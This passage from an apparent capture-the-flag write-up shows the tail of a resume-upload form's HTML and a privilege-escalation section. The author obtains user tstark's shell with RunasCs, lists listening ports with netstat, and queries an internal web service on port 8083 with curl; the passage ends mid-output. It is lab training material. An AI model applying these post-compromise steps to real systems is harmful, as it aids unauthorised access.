</span></span><span style="display:flex;"><span>          <span style="color:#ff79c6">&lt;</span>option value<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;100 000&#34;</span> <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;inpstyl&#34;</span><span style="color:#ff79c6">&gt;</span><span style="color:#bd93f9">100</span> <span style="color:#bd93f9">000</span><span style="color:#ff79c6">$&lt;/</span>option<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>          <span style="color:#ff79c6">&lt;</span>option value<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;200 000&#34;</span> <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;inpstyl&#34;</span><span style="color:#ff79c6">&gt;</span><span style="color:#bd93f9">200</span> <span style="color:#bd93f9">000</span><span style="color:#ff79c6">$&lt;/</span>option<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>          <span style="color:#ff79c6">&lt;</span>option value<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;300 000&#34;</span> <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;inpstyl&#34;</span><span style="color:#ff79c6">&gt;</span><span style="color:#bd93f9">300</span> <span style="color:#bd93f9">000</span><span style="color:#ff79c6">$&lt;/</span>option<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&lt;/</span>select<span style="color:#ff79c6">&gt;&lt;</span>br<span style="color:#ff79c6">/&gt;&lt;</span>br<span style="color:#ff79c6">/&gt;</span>
</span></span><span style="display:flex;"><span>	 <span style="color:#ff79c6">&lt;</span>h3<span style="color:#ff79c6">&gt;</span>Choose Your Department<span style="color:#ff79c6">&lt;/</span>h3<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&lt;</span>select id<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;&#34;</span> <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;inpstyles&#34;</span>style<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;background:#151715; color:#ffffff; font-weight:bold&#34;</span>  name<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;department&#34;</span> required<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>          <span style="color:#ff79c6">&lt;</span>option value<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;IT&#34;</span> <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;inpstyl&#34;</span><span style="color:#ff79c6">&gt;</span>IT<span style="color:#ff79c6">&lt;/</span>option<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>          <span style="color:#ff79c6">&lt;</span>option value<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;Sales&#34;</span> <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;inpstyl&#34;</span><span style="color:#ff79c6">&gt;</span>Sales<span style="color:#ff79c6">&lt;/</span>option<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>          <span style="color:#ff79c6">&lt;</span>option value<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;Management&#34;</span> <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;inpstyl&#34;</span><span style="color:#ff79c6">&gt;</span>Management<span style="color:#ff79c6">&lt;/</span>option<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&lt;/</span>select<span style="color:#ff79c6">&gt;</span> 
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&lt;</span>br<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&lt;</span>br<span style="color:#ff79c6">&gt;&lt;</span>div style<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;display:flex; flex-direction:column;  align-items: center;justify-content: center;&#34;</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>	 <span style="color:#ff79c6">&lt;</span>h3 style<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;padding-left:50px&#34;</span> <span style="color:#ff79c6">&gt;</span>Upload Resume:<span style="color:#ff79c6">&lt;/</span>h3<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&lt;</span>input id<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;&#34;</span> <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;inpstylef&#34;</span> type<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;file&#34;</span> name<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;assignment&#34;</span><span style="color:#ff79c6">&gt;&lt;/</span>div<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&lt;</span>br<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&lt;</span>br<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&lt;</span>br<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&lt;</span>button type<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;submit&#34;</span> style<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;margin-bottom:15px; color:#ffffff; background:#151715; width:50%; font-weight:bold ;height:35px&#34;</span> name<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;submit&#34;</span><span style="color:#ff79c6">&gt;</span>Upload Resume<span style="color:#ff79c6">&lt;/</span>button<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">&lt;/</span>form<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;/</span>div<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">&lt;/</span>center<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">&lt;/</span>body<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">&lt;/</span>html<span style="color:#ff79c6">&gt;</span> 
</span></span></code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
<p>Using <code>RunasCs.exe</code> I was able to get <code>tstark</code>&rsquo;s shell and found the user flag.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>C:\Users\tstark\Desktop&gt;dir
</span></span><span style="display:flex;"><span>dir
</span></span><span style="display:flex;"><span> Volume in drive C has no label.
</span></span><span style="display:flex;"><span> Volume Serial Number is C626-9388
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span> Directory of C:\Users\tstark\Desktop
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>04/29/2024  02:40 AM    &lt;DIR&gt;          .
</span></span><span style="display:flex;"><span>01/18/2024  11:33 AM    &lt;DIR&gt;          ..
</span></span><span style="display:flex;"><span>04/29/2024  02:40 AM             7,168 a.exe
</span></span><span style="display:flex;"><span>04/28/2024  09:59 PM                34 user.txt
</span></span><span style="display:flex;"><span>               2 File(s)          7,202 bytes
</span></span><span style="display:flex;"><span>               2 Dir(s)   4,989,374,464 bytes free
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>C:\Users\tstark\Desktop&gt;
</span></span></code></pre></div><p>After a lot of enumeration I found some open ports on the box.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-gdscript3" data-lang="gdscript3"><span style="display:flex;"><span>C:\Users\tstark\Downloads<span style="color:#ff79c6">&gt;</span>netstat <span style="color:#ff79c6">-</span>ano <span style="color:#ff79c6">|</span> findstr <span style="color:#f1fa8c">&#34;LISTENING&#34;</span>
</span></span><span style="display:flex;"><span>netstat <span style="color:#ff79c6">-</span>ano <span style="color:#ff79c6">|</span> findstr <span style="color:#f1fa8c">&#34;LISTENING&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>TCP    <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">80</span>             <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">0</span>              LISTENING       <span style="color:#bd93f9">4612</span>
</span></span><span style="display:flex;"><span>TCP    <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">88</span>             <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">0</span>              LISTENING       <span style="color:#bd93f9">684</span>
</span></span><span style="display:flex;"><span>TCP    <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">135</span>            <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">0</span>              LISTENING       <span style="color:#bd93f9">920</span>
</span></span><span style="display:flex;"><span>TCP    <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">389</span>            <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">0</span>              LISTENING       <span style="color:#bd93f9">684</span>
</span></span><span style="display:flex;"><span>TCP    <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">443</span>            <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">0</span>              LISTENING       <span style="color:#bd93f9">4612</span>
</span></span><span style="display:flex;"><span>TCP    <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">445</span>            <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">0</span>              LISTENING       <span style="color:#bd93f9">4</span>
</span></span><span style="display:flex;"><span>TCP    <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">464</span>            <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">0</span>              LISTENING       <span style="color:#bd93f9">684</span>
</span></span><span style="display:flex;"><span>TCP    <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">593</span>            <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">0</span>              LISTENING       <span style="color:#bd93f9">920</span>
</span></span><span style="display:flex;"><span>TCP    <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">636</span>            <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">0</span>              LISTENING       <span style="color:#bd93f9">684</span>
</span></span><span style="display:flex;"><span>TCP    <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">3268</span>           <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">0</span>              LISTENING       <span style="color:#bd93f9">684</span>
</span></span><span style="display:flex;"><span>TCP    <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">3269</span>           <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">0</span>              LISTENING       <span style="color:#bd93f9">684</span>
</span></span><span style="display:flex;"><span>TCP    <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">3306</span>           <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">0</span>              LISTENING       <span style="color:#bd93f9">7116</span>
</span></span><span style="display:flex;"><span>TCP    <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">3389</span>           <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">0</span>              LISTENING       <span style="color:#bd93f9">352</span>
</span></span><span style="display:flex;"><span>TCP    <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">5985</span>           <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">0</span>              LISTENING       <span style="color:#bd93f9">4</span>
</span></span><span style="display:flex;"><span>TCP    <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">8083</span>           <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">0</span>              LISTENING       <span style="color:#bd93f9">4612</span>
</span></span><span style="display:flex;"><span>TCP    <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">9389</span>           <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">0</span>              LISTENING       <span style="color:#bd93f9">2916</span>
</span></span><span style="display:flex;"><span>TCP    <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">47001</span>          <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">0</span>              LISTENING       <span style="color:#bd93f9">4</span>
</span></span><span style="display:flex;"><span>TCP    <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">49664</span>          <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">0</span>              LISTENING       <span style="color:#bd93f9">684</span>
</span></span><span style="display:flex;"><span>TCP    <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">49665</span>          <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">0</span>              LISTENING       <span style="color:#bd93f9">544</span>
</span></span><span style="display:flex;"><span>TCP    <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">49666</span>          <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">0</span>              LISTENING       <span style="color:#bd93f9">1172</span>
</span></span><span style="display:flex;"><span>TCP    <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">49667</span>          <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">0</span>              LISTENING       <span style="color:#bd93f9">1560</span>
</span></span><span style="display:flex;"><span>TCP    <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">49668</span>          <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">0</span>              LISTENING       <span style="color:#bd93f9">684</span>
</span></span><span style="display:flex;"><span>TCP    <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">49670</span>          <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">0</span>              LISTENING       <span style="color:#bd93f9">2260</span>
</span></span><span style="display:flex;"><span>TCP    <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">55479</span>          <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">0</span>              LISTENING       <span style="color:#bd93f9">684</span>
</span></span><span style="display:flex;"><span>TCP    <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">55485</span>          <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">0</span>              LISTENING       <span style="color:#bd93f9">684</span>
</span></span><span style="display:flex;"><span>TCP    <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">55495</span>          <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">0</span>              LISTENING       <span style="color:#bd93f9">664</span>
</span></span><span style="display:flex;"><span>TCP    <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">60177</span>          <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">0</span>              LISTENING       <span style="color:#bd93f9">7220</span>
</span></span><span style="display:flex;"><span>TCP    <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">60180</span>          <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">0</span>              LISTENING       <span style="color:#bd93f9">7244</span>
</span></span><span style="display:flex;"><span>TCP    <span style="color:#bd93f9">10.10</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">11.3</span>:<span style="color:#bd93f9">53</span>          <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">0</span>              LISTENING       <span style="color:#bd93f9">7220</span>
</span></span><span style="display:flex;"><span>TCP    <span style="color:#bd93f9">10.10</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">11.3</span>:<span style="color:#bd93f9">139</span>         <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">0</span>              LISTENING       <span style="color:#bd93f9">4</span>
</span></span><span style="display:flex;"><span>TCP    <span style="color:#bd93f9">127.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.1</span>:<span style="color:#bd93f9">53</span>           <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">0</span>              LISTENING       <span style="color:#bd93f9">7220</span>
</span></span><span style="display:flex;"><span>TCP    [::]:<span style="color:#bd93f9">80</span>                [::]:<span style="color:#bd93f9">0</span>                 LISTENING       <span style="color:#bd93f9">4612</span>
</span></span><span style="display:flex;"><span>TCP    [::]:<span style="color:#bd93f9">88</span>                [::]:<span style="color:#bd93f9">0</span>                 LISTENING       <span style="color:#bd93f9">684</span>
</span></span><span style="display:flex;"><span>TCP    [::]:<span style="color:#bd93f9">135</span>               [::]:<span style="color:#bd93f9">0</span>                 LISTENING       <span style="color:#bd93f9">920</span>
</span></span><span style="display:flex;"><span>TCP    [::]:<span style="color:#bd93f9">443</span>               [::]:<span style="color:#bd93f9">0</span>                 LISTENING       <span style="color:#bd93f9">4612</span>
</span></span><span style="display:flex;"><span>TCP    [::]:<span style="color:#bd93f9">445</span>               [::]:<span style="color:#bd93f9">0</span>                 LISTENING       <span style="color:#bd93f9">4</span>
</span></span><span style="display:flex;"><span>TCP    [::]:<span style="color:#bd93f9">464</span>               [::]:<span style="color:#bd93f9">0</span>                 LISTENING       <span style="color:#bd93f9">684</span>
</span></span><span style="display:flex;"><span>TCP    [::]:<span style="color:#bd93f9">593</span>               [::]:<span style="color:#bd93f9">0</span>                 LISTENING       <span style="color:#bd93f9">920</span>
</span></span><span style="display:flex;"><span>TCP    [::]:<span style="color:#bd93f9">3306</span>              [::]:<span style="color:#bd93f9">0</span>                 LISTENING       <span style="color:#bd93f9">7116</span>
</span></span><span style="display:flex;"><span>TCP    [::]:<span style="color:#bd93f9">3389</span>              [::]:<span style="color:#bd93f9">0</span>                 LISTENING       <span style="color:#bd93f9">352</span>
</span></span><span style="display:flex;"><span>TCP    [::]:<span style="color:#bd93f9">5985</span>              [::]:<span style="color:#bd93f9">0</span>                 LISTENING       <span style="color:#bd93f9">4</span>
</span></span><span style="display:flex;"><span>TCP    [::]:<span style="color:#bd93f9">8083</span>              [::]:<span style="color:#bd93f9">0</span>                 LISTENING       <span style="color:#bd93f9">4612</span>
</span></span><span style="display:flex;"><span>TCP    [::]:<span style="color:#bd93f9">9389</span>              [::]:<span style="color:#bd93f9">0</span>                 LISTENING       <span style="color:#bd93f9">2916</span>
</span></span><span style="display:flex;"><span>TCP    [::]:<span style="color:#bd93f9">47001</span>             [::]:<span style="color:#bd93f9">0</span>                 LISTENING       <span style="color:#bd93f9">4</span>
</span></span><span style="display:flex;"><span>TCP    [::]:<span style="color:#bd93f9">49664</span>             [::]:<span style="color:#bd93f9">0</span>                 LISTENING       <span style="color:#bd93f9">684</span>
</span></span><span style="display:flex;"><span>TCP    [::]:<span style="color:#bd93f9">49665</span>             [::]:<span style="color:#bd93f9">0</span>                 LISTENING       <span style="color:#bd93f9">544</span>
</span></span><span style="display:flex;"><span>TCP    [::]:<span style="color:#bd93f9">49666</span>             [::]:<span style="color:#bd93f9">0</span>                 LISTENING       <span style="color:#bd93f9">1172</span>
</span></span><span style="display:flex;"><span>TCP    [::]:<span style="color:#bd93f9">49667</span>             [::]:<span style="color:#bd93f9">0</span>                 LISTENING       <span style="color:#bd93f9">1560</span>
</span></span><span style="display:flex;"><span>TCP    [::]:<span style="color:#bd93f9">49668</span>             [::]:<span style="color:#bd93f9">0</span>                 LISTENING       <span style="color:#bd93f9">684</span>
</span></span><span style="display:flex;"><span>TCP    [::]:<span style="color:#bd93f9">49670</span>             [::]:<span style="color:#bd93f9">0</span>                 LISTENING       <span style="color:#bd93f9">2260</span>
</span></span><span style="display:flex;"><span>TCP    [::]:<span style="color:#bd93f9">55479</span>             [::]:<span style="color:#bd93f9">0</span>                 LISTENING       <span style="color:#bd93f9">684</span>
</span></span><span style="display:flex;"><span>TCP    [::]:<span style="color:#bd93f9">55485</span>             [::]:<span style="color:#bd93f9">0</span>                 LISTENING       <span style="color:#bd93f9">684</span>
</span></span><span style="display:flex;"><span>TCP    [::]:<span style="color:#bd93f9">55495</span>             [::]:<span style="color:#bd93f9">0</span>                 LISTENING       <span style="color:#bd93f9">664</span>
</span></span><span style="display:flex;"><span>TCP    [::]:<span style="color:#bd93f9">60177</span>             [::]:<span style="color:#bd93f9">0</span>                 LISTENING       <span style="color:#bd93f9">7220</span>
</span></span><span style="display:flex;"><span>TCP    [::]:<span style="color:#bd93f9">60180</span>             [::]:<span style="color:#bd93f9">0</span>                 LISTENING       <span style="color:#bd93f9">7244</span>
</span></span><span style="display:flex;"><span>TCP    [::<span style="color:#bd93f9">1</span>]:<span style="color:#bd93f9">53</span>               [::]:<span style="color:#bd93f9">0</span>                 LISTENING       <span style="color:#bd93f9">7220</span>
</span></span></code></pre></div><p>Port <code>8083</code> seemed to run a a <code>internal http service</code> I previously found.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-gdscript3" data-lang="gdscript3"><span style="display:flex;"><span>C:\Users\tstark\Downloads<span style="color:#ff79c6">&gt;</span>curl <span style="color:#ff79c6">-</span>X GET <span style="color:#bd93f9">127.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.1</span>:<span style="color:#bd93f9">8083</span>
</span></span><span style="display:flex;"><span>curl <span style="color:#ff79c6">-</span>X GET <span style="color:#bd93f9">127.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.1</span>:<span style="color:#bd93f9">8083</span>
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">%</span> Total    <span style="color:#ff79c6">%</span> Received <span style="color:#ff79c6">%</span> Xferd  Average Speed   Time    Time     Time  Current
</span></span><span style="display:flex;"><span>                                 Dload  Upload   Total   Spent    Left  Speed
</span></span><span style="display:flex;"><span>  <span style="color:#bd93f9">0</span>     <span style="color:#bd93f9">0</span>    <span style="color:#bd93f9">0</span>     <span style="color:#bd93f9">0</span>    <span style="color:#bd93f9">0</span>     <span style="color:#bd93f9">0</span>      <span style="color:#bd93f9">0</span>      <span style="color:#bd93f9">0</span> <span style="color:#ff79c6">--</span>:<span style="color:#ff79c6">--</span>:<span style="color:#ff79c6">--</span> <span style="color:#ff79c6">--</span>:<span style="color:#ff79c6">--</span>:<span style="color:#ff79c6">--</span> <span style="color:#ff79c6">--</span>:<span style="color:#ff79c6">--</span>:<span style="color:#ff79c6">--</span>     <span style="color:#bd93f9">0</span><span style="color:#ff79c6">&lt;!</span>doctype html<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">&lt;</span>html lang<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;en&#34;</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">&lt;</span>head<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;!--</span> Required meta tags <span style="color:#ff79c6">--&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;</span>meta charset<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;utf-8&#34;</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;</span>meta name<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;viewport&#34;</span> content<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;width=device-width, initial-scale=1, shrink-to-fit=no&#34;</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;!--</span> Bootstrap CSS <span style="color:#ff79c6">--&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;</span>link rel<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;stylesheet&#34;</span> href<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;css/squarely.css&#34;</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;!--</span>common<span style="color:#ff79c6">.</span>css  <span style="color:#ff79c6">--&gt;</span>
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">&lt;</span>link rel<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;stylesheet&#34;</span> href<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;css/common.css&#34;</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;</span>title<span style="color:#ff79c6">&gt;</span>Holography Industries<span style="color:#ff79c6">&lt;/</span>title<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">&lt;/</span>head<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">&lt;</span>body<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">&lt;!--</span>navbar <span style="color:#ff79c6">--&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;</span>nav <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;navbar navbar-expand-lg navbar-dark bg-primary&#34;</span><span style="color:#ff79c6">&gt;</span>
